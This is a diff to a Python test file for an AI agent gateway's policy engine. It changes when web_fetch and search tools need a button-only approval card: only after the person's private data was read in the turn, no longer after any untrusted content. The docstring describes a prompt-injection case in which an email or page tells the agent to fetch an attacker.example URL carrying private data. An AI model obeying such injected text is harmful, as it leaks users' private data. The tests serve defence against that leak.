@@ -1,11 +1,13 @@
-"""web_fetch / web_search / image_search after content entered the turn (review 4).
+"""web_fetch / web_search / image_search after a PRIVATE read (review 4, 2026-10-24).
 
 An email or page the agent read can tell it to fetch
 https://attacker.example/?d=<private data>; the fetch IS the leak, whatever
 comes back. User decision (2026-10-21): these tools stay Tier 1 in a clean
 turn and become Tier 3 (a card, button-only) once content has entered it.
-The origin is the policy engine's existing one (lineage.initiation_origin via
-PolicyMiddleware._origin), not a new model.
+Owner decision (2026-10-24): "content" narrowed to "the person's PRIVATE data
+was read in this turn" (app/policy/private_reads.py): untrusted web content
+alone has nothing of the person's to leak, so search results no longer make
+the next lookup a card. A file read still does.
 
 Through the production composition root: `create_app()` with its lifespan
 (the `gateway` fixture), the policy middleware production builds, and the
@@ -88,16 +90,16 @@ def test_web_fetch_after_a_tool_result_is_a_card_and_does_not_run(gateway):
     assert "read_file" in str(cards[0]), cards[0]  # says what suggested it
 
 
-def test_a_second_lookup_after_search_results_is_a_card(gateway):
-    """Search results are content too: the first search runs, the fetch it
-    suggests does not."""
-    steps = [_call("web_search", {"query": "acme news"}, "s1"), _call("web_fetch", {"url": EXFIL_URL}, "f1")]
+def test_a_second_lookup_after_search_results_runs(gateway):
+    """Search results are untrusted, but not the person's data: with nothing
+    private read in the turn, the fetch a result suggests runs (2026-10-24)."""
+    steps = [_call("web_search", {"query": "acme news"}, "s1"), _call("web_fetch", {"url": "https://example.org/acme"}, "f1")]
     _run(gateway, steps, "t-search")
-    assert FETCHED == ["acme news"]
-    assert len(_cards(gateway, "web_fetch")) == 1
+    assert FETCHED == ["acme news", "https://example.org/acme"]
+    assert _cards(gateway, "web_fetch") == []
 
 
-def test_the_shipped_rules_classify_by_origin():
+def test_the_shipped_rules_classify_by_private_read():
     from app.policy.classify import classify
     from app.policy.config import ConfigLoader
     from app.policy.models import Tier
@@ -105,7 +107,8 @@ def test_the_shipped_rules_classify_by_origin():
     rules = ConfigLoader(Path(__file__).resolve().parents[2] / "app/policy/default_rules.yaml").load()
     for name in ("web_fetch", "web_search", "image_search"):
         assert classify(name, {"url": EXFIL_URL}, rules).tier is Tier.TIER_1, name
-        assert classify(name, {"url": EXFIL_URL}, rules, after_content=True).tier is Tier.TIER_3, name
+        assert classify(name, {"url": EXFIL_URL}, rules, after_content=True).tier is Tier.TIER_1, name
+        assert classify(name, {"url": EXFIL_URL}, rules, private_read=True).tier is Tier.TIER_3, name
 
 
 def test_after_content_is_validated_at_load(tmp_path):
